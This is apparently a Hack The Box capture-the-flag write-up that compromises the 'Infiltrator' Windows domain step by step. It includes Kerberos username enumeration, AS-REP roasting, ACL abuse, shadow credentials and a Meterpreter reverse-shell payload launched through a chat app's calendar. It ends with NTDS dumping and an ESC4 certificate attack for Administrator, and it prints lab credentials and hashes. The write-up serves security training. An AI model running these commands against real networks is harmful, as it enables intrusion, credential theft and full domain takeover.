---
title: 'HTB: Infiltrator'
categories: [HackTheBox]
tags: []
render_with_liquid: false
media_subpath: /images/2025-06-20-hackthebox-infiltrator/
image:
  path: room_image.png
---
## Port Scanning

| Port | Protocol | Application | Version |
| --- | --- | --- | --- |
| 53 | DNS | Simple DNS Plus | N/A |
| 80 | HTTP | Microsoft IIS | 10.0 |
| 88, 464 | Kerberos | Microsoft Windows Kerberos | N/A |
| 123 | NTP | Windows Time Service | N/A |
| 135, 593, 49667-49865 | RPC | Microsoft Windows RPC | N/A |
| 139, 445 | SMB | SMB | SMB 3.1.1 |
| 389, 636, 3268, 3269 | LDAP/LDAPS | Microsoft Windows Active Directory LDAP | N/A |
| 3389 | RDP | Microsoft Terminal Services | 10.0.17763 |
| 5985 | WinRM | Windows Remote Management | N/A |
| 9389 | MC-NMF | .NET Message Framing Protocol | N/A |
| 15220 | ??? | ??? | ??? |

## HTTP Enumeration

![image.png](image.png)

### Username Enumeration

After enumerating the web page, we see a list of employees displayed:

![image.png](image%201.png)

Using the following command, we collect employee names and add them to a list:

```bash
curl -s http://infiltrator.htb/ | grep '<h4>' | awk -F ' ' '{print $2,$3}' |\
sed 's|</h4>||g' | tail -7 > names.txt
```

We use `username-anarchy` to generate a wordlist of possible usernames from the collected employee names:

```bash
username-anarchy -i names.txt > users.txt
```

We use `kerbrute` to enumerate usernames and identify seven valid users:

```
kerbrute userenum -d INFILTRATOR.HTB --dc 10.10.11.31 users.txt

   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 03/31/25 - Ronnie Flathers @ropnop

2025/03/31 01:18:37 >  Using KDC(s):
2025/03/31 01:18:37 >   10.10.11.31:88

2025/03/31 01:18:37 >  [+] VALID USERNAME:       d.anderson@INFILTRATOR.HTB
2025/03/31 01:18:37 >  [+] VALID USERNAME:       o.martinez@INFILTRATOR.HTB
2025/03/31 01:18:37 >  [+] VALID USERNAME:       k.turner@INFILTRATOR.HTB
2025/03/31 01:18:38 >  [+] VALID USERNAME:       a.walker@INFILTRATOR.HTB
2025/03/31 01:18:38 >  [+] VALID USERNAME:       m.harris@INFILTRATOR.HTB
2025/03/31 01:18:38 >  [+] VALID USERNAME:       e.rodriguez@INFILTRATOR.HTB
2025/03/31 01:18:38 >  [+] VALID USERNAME:       l.clark@INFILTRATOR.HTB
2025/03/31 01:18:38 >  Done! Tested 105 usernames (7 valid) in 0.954 seconds
```

## Domain Foothold

### AS-REP Roasting Attack

We add the discovered names to a new wordlist and perform an AS-REP roasting attack:

```bash
cat users1 | awk '{print $7}' | cut -d '@' -f1 > users.txt
```

```bash
nxc ldap 10.10.11.31 -u users.txt -p '' --asreproast output.txt
```

![image.png](image%202.png)

### Hash Cracking

```bash
hashcat -m 18200 l.clark_hash /usr/share/wordlists/rockyou.txt
```

![image.png](image%203.png)

```
l.clark:WAT?watismypass!
```

### Password Spraying

We spray the retrieved password over Kerberos and discover that it is also valid for the `d.anderson` user:

```bash
nxc ldap 10.10.11.31 -u users.txt -p 'WAT?watismypass!' -k --continue-on-success
```

![image.png](image%204.png)

```
d.anderson:WAT?watismypass!
```

## Domain Enumeration

### User Enumeration

We use `nxc` to enumerate all domain users:

```bash
nxc ldap 10.10.11.31 -u d.anderson -p 'WAT?watismypass!' --users -k
```

![image.png](image%205.png)

```bash
cat users1 | awk '{print $5}' > users.txt
```

We also notice that the `description` field for the `k.turner` user contains a password, but it is not valid for the domain:

```
k.turner:MessengerApp@Pass!
```

### BloodHound Collection

We use `bloodhound-ce-python` to ingest BloodHound and collect domain information:

```bash
bloodhound-ce-python -u l.clark -p 'WAT?watismypass!' -d INFILTRATOR.HTB \
-dc-ip 10.10.11.31 -ns 10.10.11.31 -c All --zip
```

![image.png](image%206.png)

## LM: d.anderson → e.rodriguez

After reviewing the BloodHound data, we see that the `d.anderson` user has the `GenericAll` ACL on the Marketing Digital OU, which includes the `e.rodriguez` user:

![image.png](image%207.png)

### DACL Attack: GenericAll

We use `dacledit.py` to grant the `d.anderson` user the `GenericAll` ACL over the Marketing Digital OU, which inherits the rights down to the `e.rodriguez` user:

```bash
impacket-dacledit INFILTRATOR.HTB/d.anderson:'WAT?watismypass!' -k \
-principal 'd.anderson' -target-dn "OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB" \
-action 'write' -rights 'FullControl' -inheritance
```

![image.png](image%208.png)

We then use `getTGT.py` to obtain a TGT for the `d.anderson` user:

```bash
impacket-getTGT INFILTRATOR.HTB/d.anderson:'WAT?watismypass!'
export KRB5CCNAME=$(pwd)/d.anderson.ccache
```

### Shadow Credentials Attack

We use `certipy` to perform a **Shadow Credentials** attack on the `e.rodriguez` user and obtain its NT hash:

```bash
certipy shadow auto -k -no-pass -account 'e.rodriguez' \
-target DC01.INFILTRATOR.HTB -target-ip 10.10.11.31 -ns 10.10.11.31
```

![image.png](image%209.png)

```
e.rodriguez:b02e97f2fdb5c3d36f77375383449e56
```

## LM: e.rodriguez → m.harris

After reviewing the BloodHound data, we see that the `e.rodriguez` user can add itself to the `Chiefs Marketing` domain group, which can change the password of the `m.harris` user:

![image.png](image%2010.png)

### DACL Attack: AddSelf

We use `bloodyAD` to add the `e.rodriguez` user to the `Chiefs Marketing` domain group:

```bash
bloodyAD --host DC01.INFILTRATOR.HTB -d INFILTRATOR.HTB --dc-ip 10.10.11.31 \
-u 'e.rodriguez' -p ':b02e97f2fdb5c3d36f77375383449e56' \
add groupMember "Chiefs Marketing" "e.rodriguez"
```

![image.png](image%2011.png)

### DACL Attack: ForceChangePassword

We then use `bloodyAD` to change the password of the `m.harris` user:

```bash
bloodyAD --host DC01.INFILTRATOR.HTB -d INFILTRATOR.HTB --dc-ip 10.10.11.31 \
-u 'e.rodriguez' -p ':b02e97f2fdb5c3d36f77375383449e56' \
set password "m.harris" "Password@987"
```

![image.png](image%2012.png)

## Host Foothold

After reviewing the BloodHound data, we see that the `m.harris` user belongs to the `Remote Management Users` group, which means we can use `evil-winrm` to log in:

![image.png](image%2013.png)

We can follow the provided guide to set up Kerberos authentication for `evil-winrm`:

[Setting Up evil-winrm for Kerberos Authentication](https://notes.benheater.com/books/active-directory/page/kerberos-authentication-from-kali)

We use `getTGT.py` to obtain a TGT for the `m.harris` user:

```bash
impacket-getTGT INFILTRATOR.HTB/m.harris:'Password@987'
export KRB5CCNAME=$(pwd)/m.harris.ccache
```

Logging in via `evil-wirnm` as the `m.harris` user:

```bash
evil-winrm -i DC01 -r INFILTRATOR.HTB
```

![image.png](image%2014.png)

### BloodHound Collection

We use `SharpHound.exe` to ingest BloodHound, collect more accurate domain information, and overwrite the existing data in BloodHound:

![image.png](image%2015.png)

## LM: m.harris → winrm_svc

After enumerating the target host, we see that the `Output Messenger` application is installed and running:

![image.png](image%2016.png)

### Forwarding Internal Ports

We use `ligolo-ng` to forward all internal ports to the `240.0.0.1` IP address on our Kali:

```bash
sudo ip tuntap add user $(whoami) mode tun internal; sudo ip link set internal up
sudo ip route add 240.0.0.1/24 dev internal
```

![image.png](image%2017.png)

We then use `socat` to expose the forwarded ports for `Output Messenger` to the Windows host, as a Windows application is required for authentication:

```bash
for port in {14121..14126}; do socat TCP-LISTEN:$port,bind=192.168.0.110,fork TCP:240.0.0.1:$port &; done
```

### Output Messenger

We download the **Output Messenger** client for Windows and use the previously discovered credentials for the `k.turner` user to authenticate:

![image.png](image%2018.png)

After exploring the conversations, we find a group chat discussing an application that retrieves user data from LDAP:

![image.png](image%2019.png)

Checking the `Output Wall`, we discover the plaintext credentials for the `m.harris` user:

![image.png](image%2020.png)

```
m.harris:D3v3l0p3r_Pass@1337!
```

We use the credentials for the `m.harris` user to authenticate to the `Output Messenger` server. After checking the conversation with `Admin`, we find a copy of the previously discussed `UserExplorer.exe` application:

![image.png](image%2021.png)

### Binary Analysis

We download the executable and use `dnSpy` to decompile it:

![image.png](image%2022.png)

![image.png](image%2023.png)

The code includes two classes: `Decryptor` and `LdapApp`. The `Decryptor` class contains the `DecryptString()` function, which Base64 decodes and AES decrypts the given ciphertext using the provided key. The `LdapApp` class contains the main function, which holds the hardcoded credentials for the `winrm_svc` user in encrypted format, along with the decryption key.

We use **CyberChef** to reverse the process and obtain the credentials for the `winrm_svc` user. The password is double encrypted, so we need to repeat the process twice:

![image.png](image%2024.png)

```
winrm_svc:WinRm@$svc^!^P
```

## LM: winrm_svc → o.martinez

### Output Messenger API

We log in as the `winrm_svc` user to the `Output Messenger` and discover an API key in the Notes section:

![image.png](image%2025.png)

Checking the conversation with `o.martinez`, we discover that her password was compromised in the `Chiefs_Marketing_chat` group:

![image.png](image%2026.png)

To access the chat logs of the `Chiefs_Marketing_chat`, we need to identify a `roomkey` value for the chatroom:

![image.png](image%2027.png)

We can find this value inside the user's `AppData` folder in a SQLite database:

![image.png](image%2028.png)

We transfer the database to Kali and find the `roomkey` value inside the `om_chatroom` table in the database:

![image.png](image%2029.png)

We use the `/api/chatrooms/logs` endpoint with the discovered `roomkey` and find the plaintext **Output Messenger** credentials for the `o.martinez` user:

![image.png](image%2030.png)

![image.png](image%2031.png)

```
O.martinez:m@rtinez@1996!
```

### Scheduling Calendar Tasks

Logging in to the Output Messenger as the `o.martinez` user yields access to the **Calendar** functionality:

![image.png](image%2032.png)

We right-click the pane corresponding to the current day, click **New Event** to create a new event, and select **Run Application** from the dropdown menu:

![image.png](image%2033.png)

We create a **Meterpreter** payload using `msfvenom` and upload it to a location on the remote host accessible to any user:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=9001 -f exe -o meter.exe
```

![Uploading the Payload to the Target](image%2034.png)

We create a new handler in **Metasploit**, configure the following options, and run the module:

```bash
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.10.14.190
msf6 exploit(multi/handler) > set lport 9001
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.190:9001
```

We also place a PE binary named `meter.exe` on our Windows host in the same directory path as on the remote host:

![image.png](image%2035.png)

We use the **New Event** window and select the file from the Browse menu. We also set the time to five minutes ahead of the local time to give the task ample time to execute on the remote host:

![image.png](image%2036.png)

We save the task, right-click it, and click **Sync Calendar** to sync the event to the remote host:

![image.png](image%2037.png)

Waiting a short period, we obtain a Meterpreter shell on the handler:

![image.png](image%2038.png)

## LM: o.martinez → lan_managment

### Network Capture Analysis

Enumerating the target host as `o.martinez` reveals a network capture inside the **Output Messenger** cache folder:

![image.png](image%2039.png)

We transfer the file to the attack host, open it in **Wireshark**, and observe multiple HTTP traffic streams, including a **GET** request to a `.7z` archive:

![image.png](image%2040.png)

We navigate to **File** → **Export Objects** → **HTTP** and save the `.7z` archive to the attack host:

![image.png](image%2041.png)

Analyzing the HTTP traffic streams reveals a password being sent in an HTTP request:

![image.png](image%2042.png)

Attempting the password against the `o.martinez` user confirms it as a valid match:

![image.png](image%2043.png)

```
o.martinez:M@rtinez_P@ssw0rd!
```

### Extracting the 7z Archive

We use `7z2john` to generate the archive’s hash, use `john` to crack the password, and use `7z` to extract its contents:

```bash
7z2john BitLocker-backup.7z > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

![Cracking the Password of the 7z Archive](image%2044.png)

```bash
7z x BitLocker-backup.7z
```

Reviewing the extracted folder, we discover a static HTML page:

![image.png](image%2045.png)

Opening the `.html` file in a web browser reveals a recovery key for a **BitLocker** volume:

![image.png](image%2046.png)

```
650540-413611-429792-307362-466070-397617-148445-087043
```

### RDP Access on the Host

After reviewing the BloodHound data, we see that the `o.martinez` user is a member of the **Remote Desktop Users** domain group, meaning we can login to the host via RDP:

![image.png](image%2047.png)

We can use `nxc` to confirm the RDP access:

![image.png](image%2048.png)

Logging in as the `o.martinez` user via **RDP** using `remmina`:

```bash
remmina -c rdp://o.martinez:M%40rtinez_P%40ssw0rd%21@10.10.11.31:3389
```

![image.png](image%2049.png)

### BitLocker Decryption

Enumerating the target host using **File Explorer** reveals an encrypted BitLocker volume mounted on the `E:` drive:

![image.png](image%2050.png)

Double-clicking it opens the BitLocker password prompt, where we can enter the previously discovered recovery key and decrypt the volume:

![image.png](image%2051.png)

After decrypting the volume, we find another `.7z` archive in the **Administrator** user's home directory:

![image.png](image%2052.png)

### Dumping the NTDS Database

Transferring the archive to our attack host and extracting it reveals an `NTDS.dit` file, along with the `SYSTEM` and `SECURITY` registry hives:

![image.png](image%2053.png)

Using the `secretsdump.py` script from the **Impacket** suite to dump NTLM hashes yields no working credentials except for the `L.clark` user. We instead use the `ntdissector` tool to dump all user information from the database:

```bash
ntdissector -ntds ntds.dit -system SYSTEM -outputdir ntdissector -ts -f user
```

![image.png](image%2054.png)

![image.png](image%2055.png)

Reviewing the contents of the JSON file reveals a password in the description field of the `lan_managment` user:

![image.png](image%2056.png)

Testing the password against the `lan_managment` user, we observe a valid match:

![image.png](image%2057.png)

```
lan_managment:l@n_M@an!1331
```

## LM: lan_managment → infiltrator_svc$

After reviewing the BloodHound data, we see that the `lan_managment` user has the `ReadGMSAPassword` edge on the `infiltrator_svc$` service account:

![image.png](image%2058.png)

We use `nxc` to retreive the NT hash of the `infiltrator_svc$` service account:

![image.png](image%2059.png)

```
infiltrator_svc$:653b2726881d6e5e9ae3690950f9bcc4
```

## LM: infiltrator_svc$ → Administrator

After reviewing the BloodHound data, we see that the `infiltrator_svc$` service account can perform an **ESC4** attack:

![image.png](image%2060.png)

We use `certipy` to enumerate vulnerable certificate templates and confirm that this account can enroll the `Infiltrator_Template` template, which is vulnerable to the **ESC4** vulnerability:

```bash
certipy find -vulnerable \
-u 'infiltrator_svc$@tombwatcher.htb' -hashes '653b2726881d6e5e9ae3690950f9bcc4' \
-dc-ip 10.10.11.31
```

```
Certificate Templates
  0
    Template Name                       : Infiltrator_Template
    Display Name                        : Infiltrator_Template
    Certificate Authorities             : infiltrator-DC01-CA
...
    [+] User ACL Principals             : INFILTRATOR.HTB\infiltrator_svc
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.
```

### ESC4 Attack

[ESC4: Template Hijacking](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc4-template-hijacking)

1. **Modifying the Template to a Vulnerable State**:
    
    ```bash
    certipy template \
    -u 'infiltrator_svc$@tombwatcher.htb' -hashes '653b2726881d6e5e9ae3690950f9bcc4' \
    -dc-ip '10.10.11.31' -template 'Infiltrator_Template' \
    -write-default-configuration
    ```
    
    ![image.png](image%2061.png)
    
2. **Requesting a Certificate via the Vulnerable Template**:
    
    ```bash
    certipy req \
    -u 'infiltrator_svc$@tombwatcher.htb' -hashes '653b2726881d6e5e9ae3690950f9bcc4' \
    -dc-ip '10.10.11.31' -target 'DC01.INFILTRATOR.HTB' \
    -ca 'infiltrator-DC01-CA' -template 'Infiltrator_Template' \
    -upn 'administrator@infiltrator.htb' -sid 'S-1-5-21-2606098828-3734741516-3625406802-500'
    ```
    
    ![image.png](image%2062.png)
    
3. **Authenticating with the Certificate**:
    
    ```bash
    certipy auth -pfx administrator.pfx -dc-ip 10.10.11.31
    ```
    
    ![image.png](image%2063.png)
    

### Root

Logging in as **Administrator** via WinRM:

![image.png](image%2064.png)